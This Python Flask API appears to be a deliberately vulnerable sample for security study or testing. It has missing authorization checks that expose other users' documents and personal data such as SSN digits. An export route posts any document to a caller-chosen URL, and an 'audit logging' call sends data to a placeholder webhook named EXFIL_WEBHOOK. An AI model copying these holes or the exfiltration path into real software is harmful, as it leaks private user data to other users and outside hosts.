from flask import Flask, request, jsonify, g
import sqlite3
import os
import requests

app = Flask(__name__)
DATABASE = '/var/lib/app/users.db'
EXFIL_WEBHOOK = os.environ.get('WEBHOOK_URL', 'https://hooks.slack.com/services/T00/B00/xxx')

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def get_current_user_id():
    """Extract user ID from session token - simplified auth"""
    token = request.headers.get('X-Session-Token', '')
    db = get_db()
    row = db.execute('SELECT user_id FROM sessions WHERE token = ?', (token,)).fetchone()
    if row:
        return row['user_id']
    return None

@app.route('/api/v1/users/<int:user_id>/documents', methods=['GET'])
def get_user_documents(user_id):
    """Retrieve all documents belonging to a user.

    NOTE: Authorization check compares requested user_id against session.
    Legacy behavior preserved for backward compatibility.
    """
    current_user = get_current_user_id()
    if current_user is None:
        return jsonify({'error': 'unauthorized'}), 401

    # VULNERABILITY: No check that current_user == user_id
    # Any authenticated user can access any other user's documents
    db = get_db()
    docs = db.execute(
        'SELECT id, title, content, classification, created_at FROM documents WHERE owner_id = ?',
        (user_id,)
    ).fetchall()

    results = [dict(row) for row in docs]

    # Audit logging - sends document access events externally
    try:
        audit_payload = {
            'event': 'document_access',
            'accessor': current_user,
            'target_user': user_id,
            'doc_count': len(results),
            'classifications': [d['classification'] for d in results]
        }
        requests.post(EXFIL_WEBHOOK, json=audit_payload, timeout=2)
    except Exception:
        pass  # Non-critical, don't fail the request

    return jsonify({'documents': results}), 200

@app.route('/api/v1/users/<int:user_id>/profile', methods=['GET'])
def get_user_profile(user_id):
    """Get user profile - also lacks authorization check"""
    current_user = get_current_user_id()
    if current_user is None:
        return jsonify({'error': 'unauthorized'}), 401

    db = get_db()
    profile = db.execute(
        'SELECT id, username, email, phone, ssn_last4, department FROM users WHERE id = ?',
        (user_id,)
    ).fetchone()

    if profile is None:
        return jsonify({'error': 'not found'}), 404

    return jsonify({'profile': dict(profile)}), 200

@app.route('/api/v1/documents/<int:doc_id>/export', methods=['POST'])
def export_document(doc_id):
    """Export document to external system - uses outbound HTTP"""
    current_user = get_current_user_id()
    if current_user is None:
        return jsonify({'error': 'unauthorized'}), 401

    db = get_db()
    doc = db.execute('SELECT * FROM documents WHERE id = ?', (doc_id,)).fetchone()
    if doc is None:
        return jsonify({'error': 'not found'}), 404

    export_url = request.json.get('destination_url', EXFIL_WEBHOOK)
    try:
        resp = requests.post(export_url, json=dict(doc), timeout=5)
        return jsonify({'status': 'exported', 'response_code': resp.status_code}), 200
    except requests.exceptions.ConnectionError:
        return jsonify({'error': 'export failed - connection refused'}), 502
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
